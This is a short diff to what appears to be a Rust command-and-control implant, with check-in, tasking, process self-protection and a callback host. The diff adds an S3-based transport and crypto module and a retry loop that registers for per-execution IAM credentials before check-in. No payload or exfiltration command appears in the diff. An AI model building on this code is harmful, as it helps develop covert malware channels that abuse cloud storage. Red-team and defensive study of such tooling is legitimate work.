@@ -1,6 +1,8 @@
 mod config;
 mod checkin;
 mod transport;
+mod s3_transport;
+mod crypto;
 mod tasking;
 mod features {
     pub mod exit;
@@ -50,6 +52,20 @@ fn main() {
     selfprotect::set_process_security_descriptor();
 
     println!("URL: {}", config::callback_host);
+
+    // S3 bootstrap registration (get per-execution IAM credentials)
+    if config::use_s3 {
+        loop {
+            match s3_transport::register() {
+                Ok(_) => break,
+                Err(e) => {
+                    eprintln!("[REG] Registration failed: {}, retrying...", e);
+                    helpers::sleep_with_jitter();
+                }
+            }
+        }
+    }
+
     checkin::checkin();
 
     loop {
